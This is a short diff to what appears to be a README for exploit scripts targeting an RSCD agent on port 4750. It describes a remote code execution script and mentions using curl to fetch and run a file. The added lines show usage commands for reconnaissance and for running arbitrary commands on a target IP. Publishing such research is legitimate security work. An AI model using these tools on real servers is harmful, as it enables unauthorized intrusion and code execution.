@@ -9,3 +9,9 @@ This vulnerability works up until the version 8.6 patch 1.
 
 - A second script that allows Remote Code Execution on the server through the vulnerabilities listed above.
 I was able to curl a file and execute it without any problem. I guess you can do pretty much anything from this.
+
+Usage :
+
+IntelGathering : python IntelGatheringWindows.py 192.168.1.30 (-p 4750) #default port is 4750
+
+RCE_RSCD : python RCE_RSCD.py (-p 4750) 192.168.1.30 "cmd /c 'echo Got pwned !' "
